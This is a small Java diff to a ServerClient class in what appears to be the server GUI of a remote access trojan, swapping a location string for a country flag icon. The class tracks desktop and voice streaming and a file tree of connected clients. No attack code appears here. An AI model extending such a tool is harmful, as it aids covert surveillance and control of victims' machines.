@@ -1,12 +1,15 @@
 package de.sogomn.rat.server.gui;
 
+import javax.swing.ImageIcon;
+
 import de.sogomn.rat.ActiveConnection;
 
 final class ServerClient {
 	
 	private boolean loggedIn;
 	
-	private String name, location, os, version;
+	private String name, os, version;
+	private ImageIcon flag;
 	private boolean streamingDesktop, streamingVoice;
 	private long ping;
 	
@@ -21,11 +24,11 @@ final class ServerClient {
 		fileTree = new FileTree();
 	}
 	
-	public void logIn(final String name, final String location, final String os, final String version) {
+	public void logIn(final String name, final String os, final String version, final ImageIcon flag) {
 		this.name = name;
-		this.location = location;
 		this.os = os;
 		this.version = version;
+		this.flag = flag;
 		
 		final String title = name + " " + getAddress();
 		
@@ -61,8 +64,8 @@ final class ServerClient {
 		return name;
 	}
 	
-	public String getLocation() {
-		return location;
+	public ImageIcon getFlag() {
+		return flag;
 	}
 	
 	public String getAddress() {
